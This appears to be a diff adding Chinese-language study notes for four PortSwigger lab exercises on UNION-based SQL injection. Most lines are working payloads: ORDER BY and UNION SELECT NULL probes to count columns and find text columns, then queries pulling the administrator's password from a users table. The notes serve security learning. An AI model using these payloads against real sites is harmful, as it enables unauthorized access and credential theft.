@@ -1,0 +1,40 @@
+### 确定列数 ###
+https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
+产品过滤器url为 /filter?category=Tech+gifts
+
+递增列数的数字
+' ORDER BY 3 -- 
+确定查询结构的列数为3
+
+使用递增的联合中的NULL确定列数为3
+' UNION SELECT NULL,NULL,NULL -- 
+
+### 查找列中类型为文本的列 ###
+https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
+产品过滤器url为 /filter?category=Gifts
+
+' ORDER BY 3 -- 
+确定列数
+
+' UNION SELECT NULL,'a',NULL -- 
+确定第2列类型为文本
+
+将第2列文本替换为提供的字符串
+
+### 从其他表中检索数据 ###
+https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
+使用提供的表名与列名与用户名构成输入
+' UNION SELECT username,password FROM users WHERE username='administrator'-- 
+
+### 在一个列中检索多个值 ###
+https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
+产品过滤器url为 /filter?category=Pets
+
+' ORDER BY 2 -- 
+确定列数为2
+
+' UNION SELECT NULL,'a' -- 
+确定第2列类型为文本
+
+使用提供的表名与列名与用户名构成输入
+' UNION SELECT CONCAT_WS(': ',username,password) FROM users WHERE username='administrator'-- 
